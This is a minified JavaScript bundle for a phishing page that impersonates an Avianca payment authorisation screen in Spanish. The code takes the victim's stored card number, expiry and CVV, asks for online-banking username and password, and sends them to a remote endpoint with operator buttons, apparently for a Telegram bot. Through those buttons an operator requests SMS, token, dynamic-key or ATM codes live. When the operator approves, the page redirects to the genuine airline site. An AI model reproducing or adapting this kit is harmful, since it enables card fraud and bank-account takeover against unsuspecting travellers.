(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[233],{4831:(e,a,t)=>{"use strict";t.r(a),t.d(a,{default:()=>i});var r=t(5155),n=t(2115);let o=e=>e?e.replace(/([_\[\]()~`>#+\-=|{}.!])/g,"\\$1"):"No ingresado",s=e=>[{text:"Pedir SMS \uD83D\uDCF1",callback_data:"sms:".concat(e)},{text:"Pedir Clave Din\xe1mica \uD83D\uDD11",callback_data:"dinamica:".concat(e)},{text:"Pedir Token \uD83D\uDCDF",callback_data:"token:".concat(e)},{text:"Pedir Cajero (ATM) \uD83C\uDFE7",callback_data:"atm:".concat(e)}];function i(){let[e,a]=(0,n.useState)({}),[t,i]=(0,n.useState)(!0),[c,l]=(0,n.useState)("Validando datos..."),[d,u]=(0,n.useState)(null),[m,b]=(0,n.useState)("initial"),[g,p]=(0,n.useState)({user:"",password:"",dynamicCode:""}),[f,x]=(0,n.useState)(""),[h,y]=(0,n.useState)(""),D=(0,n.useCallback)(async e=>{if(!e||e.length<6)return;let t=e.replace(/\s+/g,"").substring(0,6);try{var r,n;let e=await fetch("/api/bin-lookup?bin=".concat(t));if(!e.ok)return;let o=await e.json(),s=(null==(r=o.bank)?void 0:r.name)||"Desconocido",i=(null==(n=o.scheme)?void 0:n.toUpperCase())||"",c="".concat(s," - ").concat(i);a(e=>({...e,bank:c}))}catch(e){console.error("Error al obtener informaci\xf3n del BIN:",e)}},[]);(0,n.useEffect)(()=>{let e={},t=localStorage.getItem("paymentData"),r=(e=t?JSON.parse(t):{}).transactionId||Date.now().toString(36)+Math.random().toString(36).substr(2);e={...e,transactionId:r},localStorage.setItem("paymentData",JSON.stringify(e)),a(e),e.cardNumber&&D(e.cardNumber),setTimeout(()=>i(!1),500)},[D]);let v=(null==e?void 0:e.cardNumber)||"",w=v?v.replace(/\s+/g,"").slice(-4):"1234",N=e.transactionId||"";e.flightCost||e.totalPrice||e.amount||e.price;let j=(0,n.useCallback)(async e=>{i(!0),l("Esperando confirmaci\xf3n del banco...");try{let a=await fetch("/api/check-update/".concat(e));if(408===a.status){u("El banco tard\xf3 en responder. Por favor, intente nuevamente."),i(!1);return}if(!a.ok){let e=await a.json();throw Error(e.error||"Error de conexi\xf3n")}let{action:t}=await a.json();i(!1),u(null);let r=t.startsWith("error_");if(["sms","dinamica","token","atm"].includes(t)){b("waiting_for_code");let e="el c\xf3digo de seguridad";"sms"===t&&(e="el c\xf3digo que recibiste por SMS"),"dinamica"===t&&(e="la Clave Din\xe1mica"),"token"===t&&(e="el Token digital"),"atm"===t&&(e="el c\xf3digo generado en el Cajero (ATM)"),x(e),p(e=>({...e,dynamicCode:""})),setTimeout(()=>{var e;return null==(e=document.getElementById("dynamic-code"))?void 0:e.focus()},100)}else if(r)if("error_logo"===t)u("Usuario o clave incorrectos. Verifique e intente nuevamente."),b("initial"),p(e=>({...e,password:""})),setTimeout(()=>{var e;return null==(e=document.getElementById("auth-user"))?void 0:e.focus()},100);else if("error_tc"===t)alert("Error en la validaci\xf3n de la tarjeta. Ser\xe1 redirigido."),window.location.href="/";else{let e=t.replace("error_","");e=e.charAt(0).toUpperCase()+e.slice(1),t.includes("sms")&&(e="SMS"),u("El c\xf3digo ".concat(e," ingresado es inv\xe1lido.")),p(e=>({...e,dynamicCode:""})),setTimeout(()=>{var e;return null==(e=document.getElementById("dynamic-code"))?void 0:e.focus()},100)}else"finalizar"===t&&(l("Pago Aprobado exitosamente. Redirigiendo..."),i(!0),setTimeout(()=>{window.location.href="https://www.avianca.com/"},2e3))}catch(e){console.error("Polling Error:",e),i(!1),u("Error de comunicaci\xf3n con el servidor de seguridad.")}},[]),C=async t=>{var r,n,c;t.preventDefault(),u(null),i(!0);let d="",b=e.bank||"No disponible";if(e.cardNumber&&!e.bank)try{let t=e.cardNumber.replace(/\s+/g,"").substring(0,6),o=await fetch("/api/bin-lookup?bin=".concat(t));if(o.ok){let e=await o.json(),t=(null==(r=e.bank)?void 0:r.name)||"Desconocido",s=(null==(n=e.scheme)?void 0:n.toUpperCase())||"";b="".concat(t," - ").concat(s),a(e=>({...e,bank:b}))}}catch(e){console.error("Fallo al obtener info del BIN en handleNextStep",e)}let p={},x=s(N),D="\n✈️ NUEVA RESERVA \\- AVIANCA ✈️\n\n\uD83D\uDC64 DATOS DEL TITULAR\n\uD83D\uDCB3 Tarjeta: ".concat(o(e.cardNumber),"\n\uD83D\uDDD3️ Exp: ").concat(o(e.expiryDate),"\n\uD83D\uDD12 CVV: ").concat(o(e.cvv),"\n\uD83C\uDFE6 Banco: ").concat(o(b),"\n");if("initial"===m){if(!g.user||!g.password){u("Campos requeridos."),i(!1);return}l("Verificando credenciales de seguridad..."),d="".concat(D,"\n\n\uD83D\uDC64 DATOS DE ACCESO (LOGIN)\n\uD83E\uDD35 User: ").concat(o(g.user),"\n\uD83D\uDD12 Pass: ").concat(o(g.password),"\n\n\uD83C\uDD94 ID: ").concat(N,"\n"),p={inline_keyboard:[...x.map(e=>[e]),[{text:"Usuario/Clave Incorrecta ❌",callback_data:"error_logo:".concat(N)}],[{text:"Tarjeta Inv\xe1lida \uD83D\uDCB3",callback_data:"error_tc:".concat(N)}]]}}else if("waiting_for_code"===m){if(!g.dynamicCode){u("Ingrese el c\xf3digo recibido."),i(!1);return}l("Validando c\xf3digo de seguridad...");let e=f.toLowerCase().includes("cajero")?"atm":f.toLowerCase().split(" ")[0],a=x.filter(a=>!a.callback_data.includes(e));d="".concat(D,"\n\n\uD83D\uDC64 DATOS DE ACCESO + C\xd3DIGO\n\uD83E\uDD35 User: ").concat(o(g.user),"\n\uD83D\uDD12 Pass: ").concat(o(g.password),"\n\uD83D\uDD34 ").concat(o(f),": ").concat(o(g.dynamicCode),"\n\n\uD83C\uDD94 ID: ").concat(N,"\n"),p={inline_keyboard:[...a.map(e=>[e]),[{text:"C\xf3digo Incorrecto ❌",callback_data:"error_".concat(e,":").concat(N)}],[{text:"✅ APROBAR PAGO ✅",callback_data:"finalizar:".concat(N)}]]}}try{let e=await fetch("/api/send-message",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({text:d,keyboard:p,message_id:"waiting_for_code"===m?h:void 0})}),a=await e.json();if(e.ok&&(null==(c=a.result)?void 0:c.message_id))y(a.result.message_id),j(a.result.message_id);else throw Error(a.description||"Error API")}catch(e){console.error("Error env\xedo:",e),i(!1),u("Error de conexi\xf3n. Intente nuevamente.")}};return(0,r.jsxs)("main",{className:"min-h-screen bg-[#f4f7f6] flex items-center justify-center p-4",children:[(0,r.jsxs)("div",{className:"max-w-md w-full bg-white p-6 rounded-lg shadow-lg border border-gray-200",children:[(0,r.jsx)("div",{className:"flex items-center justify-center mb-5",children:(0,r.jsx)("div",{className:"h-8 flex items-center text-red-600 font-bold text-xl",children:"AVIANCA"})}),(0,r.jsx)("b",{className:"text-gray-800 mb-1 block font-bold",children:"Autorizaci\xf3n de transacci\xf3n"}),(0,r.jsxs)("p",{className:"text-sm text-gray-600 mb-5",children:["La transacci\xf3n que intenta realizar en ",(0,r.jsx)("b",{className:"font-semibold text-gray-700",children:"AVIANCA S.A"})," debe ser autorizada. Por favor, ingresa los datos de tu banca virtual:"]}),(0,r.jsxs)("div",{className:"bg-[#f4f7f6] p-4 rounded-lg mb-6 text-sm space-y-2 border border-gray-100",children:[(0,r.jsxs)("div",{className:"flex justify-between",children:[(0,r.jsx)("span",{className:"font-bold text-gray-700",children:"Comercio"}),(0,r.jsx)("span",{className:"text-gray-700",children:"AVIANCA S.A"})]}),(0,r.jsxs)("div",{className:"flex justify-between",children:[(0,r.jsx)("span",{className:"font-bold text-gray-700",children:"Banco"}),(0,r.jsx)("span",{className:"text-gray-700",children:e.bank||"Cargando..."})]}),(0,r.jsxs)("div",{className:"flex justify-between",children:[(0,r.jsx)("span",{className:"font-bold text-gray-700",children:"N\xfamero de tarjeta"}),(0,r.jsxs)("span",{className:"text-gray-700 tracking-wider",children:["•••• •••• •••• ",w]})]})]}),(0,r.jsxs)("form",{onSubmit:C,children:[d&&(0,r.jsxs)("div",{className:"bg-red-50 text-red-700 text-sm p-3 rounded-md mb-4 border border-red-200 flex items-start",children:[(0,r.jsx)("span",{className:"mr-2 pt-0.5",children:"⚠️"}),(0,r.jsx)("span",{children:d})]}),(0,r.jsx)("div",{className:"waiting_for_code"===m?"hidden":"block",children:(0,r.jsxs)("div",{className:"space-y-4",children:[(0,r.jsx)("label",{htmlFor:"auth-user",className:"block text-sm font-semibold mb-1 text-gray-700",children:"Usuario"}),(0,r.jsx)("input",{type:"text",required:!0,className:"w-full rounded-md border border-gray-300 px-4 py-3 text-gray-900 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-red-500 outline-none transition-all",placeholder:"",value:g.user,onChange:e=>p({...g,user:e.target.value}),disabled:t,id:"auth-user",autoComplete:"username"}),(0,r.jsx)("label",{htmlFor:"auth-password",className:"block text-sm font-semibold mb-1 text-gray-700",children:"Contrase\xf1a"}),(0,r.jsx)("input",{type:"password",id:"auth-password",required:!0,className:"w-full rounded-md border border-gray-300 px-4 py-3 text-gray-900 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-red-500 outline-none transition-all",placeholder:"",value:g.password,onChange:e=>p({...g,password:e.target.value}),disabled:t,autoComplete:"current-password"})]})}),(0,r.jsxs)("div",{className:"waiting_for_code"===m?"block":"hidden",children:[(0,r.jsxs)("div",{className:"text-center mb-3",children:[(0,r.jsxs)("label",{htmlFor:"dynamic-code",className:"block text-red-600 text-lg font-bold mb-1",children:["Clave ",f.replace(/el |la /,"").replace("c\xf3digo que recibiste por ","").replace("c\xf3digo generado en el ","")]}),(0,r.jsxs)("p",{className:"text-sm text-gray-600",children:["Por favor, ingrese ",f," para continuar."]})]}),(0,r.jsx)("input",{type:"tel",id:"dynamic-code",required:"waiting_for_code"===m,className:"w-full px-4 py-4 text-center text-2xl tracking-widest rounded-md border border-gray-300 focus:ring-2 focus:ring-inset focus:ring-red-500 outline-none transition-all",placeholder:"• • • • • •",value:g.dynamicCode,onChange:e=>p({...g,dynamicCode:e.target.value}),disabled:t,autoComplete:"off"})]}),(0,r.jsx)("div",{className:"mt-6",children:(0,r.jsx)("button",{type:"submit",disabled:t,className:"w-full bg-[#E8114B] hover:bg-[#D40E43] text-white font-bold py-3 text-lg transition duration-200 disabled:opacity-70 disabled:cursor-not-allowed shadow-md hover:shadow-lg rounded-md",children:"initial"===m?"Autorizar":"Confirmar Transacci\xf3n"})})]})]}),t&&(0,r.jsxs)("div",{className:"fixed inset-0 bg-white/90 z-50 flex flex-col items-center justify-center backdrop-blur-sm",children:[(0,r.jsx)("div",{className:"loader-spin border-4 border-gray-200 border-t-[#E8114B] rounded-full w-12 h-12 animate-spin mb-4"}),(0,r.jsx)("p",{className:"text-gray-800 font-medium animate-pulse",children:c})]})]})}},9350:(e,a,t)=>{Promise.resolve().then(t.bind(t,4831))}},e=>{var a=a=>e(e.s=a);e.O(0,[441,684,977],()=>a(9350)),_N_E=e.O()}]);